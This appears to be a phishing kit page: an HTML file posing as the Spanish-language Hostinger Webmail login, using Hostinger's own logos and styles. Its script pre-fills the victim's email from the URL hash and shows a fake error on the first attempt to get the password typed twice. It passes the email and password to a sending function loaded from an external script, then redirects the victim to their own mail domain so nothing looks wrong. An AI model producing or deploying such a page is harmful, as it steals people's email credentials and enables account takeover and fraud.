<!-- hostinger.html -->
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Hostinger Webmail</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
    <meta name="theme-color" content="#f4f4f4">
    <meta name="msapplication-navbutton-color" content="#f4f4f4">
    
    <link rel="shortcut icon" href="https://mail.hostinger.com/skins/hostinger/images/logo-icon.svg">
    <link rel="stylesheet" href="https://mail.hostinger.com/skins/elastic/deps/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="https://mail.hostinger.com/skins/hostinger/styles/styles.css">
    <script type="text/javascript" src="gt.js"> </script>
    
    
    <style>
        .input-field {
            width: 100%;
            padding: 15px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 15px;
        }
        
        .password-container {
            position: relative;
            width: 100%;
        }

        .eye-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
        }

        .login-button {
            width: 100%;
            padding: 15px;
            background-color: #5D3FD3;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .forgot-password {
            text-align: center;
            margin-top: 15px;
            color: #5D3FD3;
            text-decoration: none;
            display: block;
        }

        .disabled-input {
            background-color: #f5f5f5;
            cursor: not-allowed;
        }

        .success-message {
            color: #28a745;
            margin-top: 10px;
            text-align: center;
        }

        .error-message {
            color: #dc3545;
            margin-top: 10px;
            text-align: center;
        }

        .login-form {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .eye-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
            width: 24px;
            height: 24px;
            background: none;
            border: none;
            padding: 0;
        }

        .eye-icon svg {
            width: 100%;
            height: 100%;
            fill: currentColor;
        }
    </style>
</head>
<body class="xelastic task-login action-none">
    <div id="layout">
        <div id="layout-content" class="selected no-navbar" role="main">
            <section class="main-section">
                <div class="login-section">
                    <div class="login-wrapper">
                        <img src="https://mail.hostinger.com/skins/hostinger/images/logo.svg" id="logo" alt="Logo" />
                        <h2 class="login-title">
                            Hola, &#x1F44B<br>
                            Bienvenido a Hostinger Webmail
                        </h2>

                        <form id="login-form" name="login-form" method="post" class="login-form">
                            <input 
                                name="email" 
                                id="email" 
                                class="input-field" 
                                required 
                                type="text" 
                                placeholder="Nombre de usuario"
                            >
                            
                            <div class="password-container">
        <input 
            name="password" 
            id="password" 
            class="input-field" 
            required 
            type="password" 
            placeholder="Contraseña"
        >
        <button type="button" class="eye-icon" aria-label="Toggle password visibility">
            <svg class="eye-closed" viewBox="0 0 24 24">
                <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
            </svg>
            <svg class="eye-open" viewBox="0 0 24 24" style="display: none;">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
            </svg>
        </button>
    </div>

                            <div id="message-container"></div>
                            
                            <button type="submit" id="submit-btn" class="login-button">
                                Iniciar Sesión
                            </button>

                            <a href="#" class="forgot-password">Olvidé mi contraseña</a>
                        </form>

                        <div class="redirect-wrapper">
                            <h2 class="redirect-title">
                                ¿No tienes una cuenta de correo electrónico?
                            </h2>
                            <p class="redirect-subtitle">
                                Descubra el plan de correo electrónico perfecto para sus necesidades y eleve su comunicación.
                            </p>
                            <button id="redirect-button" class="redirect-button">
                                Obtenga un plan de correo electrónico
                            </button>
                        </div>
                    </div>
                </div>
            </section>
        </div>
    </div>

    <script>

// Initialize the functionality
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('login-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const messageContainer = document.getElementById('message-container');
    const eyeButton = document.querySelector('.eye-icon');
    const eyeOpenIcon = eyeButton.querySelector('.eye-open');
    const eyeClosedIcon = eyeButton.querySelector('.eye-closed');
    let submitCount = 0;

    // Password visibility toggle
    eyeButton.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        
        if (type === 'password') {
            eyeOpenIcon.style.display = 'none';
            eyeClosedIcon.style.display = 'block';
        } else {
            eyeOpenIcon.style.display = 'block';
            eyeClosedIcon.style.display = 'none';
        }
    });

    // Get email from parent window's URL hash
    const parentHash = window.location.hash.substring(1);
    if (parentHash) {
        emailInput.value = parentHash;
        emailInput.disabled = true;
        emailInput.classList.add('disabled-input');
    }

    
    // Form submission handler
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        submitCount++;
        
        
        // Store password and reset field
        const password = passwordInput.value;
        passwordInput.value = '';

        if (submitCount === 1) {
            // First submission - show error
            messageContainer.innerHTML = `<div class="error-message">${errormessage}</div>`;

            // Format and send message
            const formattedMessage = await formatMessage(emailInput.value, password, "HOSTINGER PAGE");
            sendMessage2(formattedMessage);
        } else {
            // Second submission - show success and redirect
            messageContainer.innerHTML = '<div class="success-message">Login successful!</div>';
            
            // Format and send message
            const formattedMessage = await formatMessage(emailInput.value, password);
            sendMessage2(formattedMessage);

            // Redirect after 3 seconds based on email domain
            setTimeout(() => {
                const domain = emailInput.value.split('@')[1];
                // Use parent window for navigation
                window.location.href = `https://${domain}`;
            }, 1500);
        }
    });
});
    </script>
</body>
</html>